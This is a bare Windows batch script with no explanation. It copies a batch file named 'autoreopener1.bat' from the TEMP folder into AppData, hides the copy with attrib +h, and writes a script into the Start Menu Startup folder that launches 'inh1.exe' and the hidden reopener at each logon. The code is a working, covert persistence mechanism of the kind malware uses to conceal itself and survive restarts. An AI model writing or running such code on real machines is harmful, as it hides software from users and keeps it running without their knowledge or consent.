@echo off
set "src=%TEMP%\autoreopener1.bat"
set "startup=%userprofile%\AppData"

if not exist "%src%" (
    echo Source file not found: %src%
    pause
    exit /b
)

copy "%src%" "%startup%\autoreopener1.bat" /Y
attrib +h "%startup%\autoreopener1.bat"

if %ERRORLEVEL%==0 (
    echo File copied successfully.
) else (
    echo Copy failed. Check permissions.
)


set "outfile=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\created_script1.bat"

(
    echo @echo off
    echo start "" "%USERPROFILE%\AppData\inh1.exe"
    echo start "" "%USERPROFILE%\AppData\autoreopener1.bat"
) > "%outfile%"





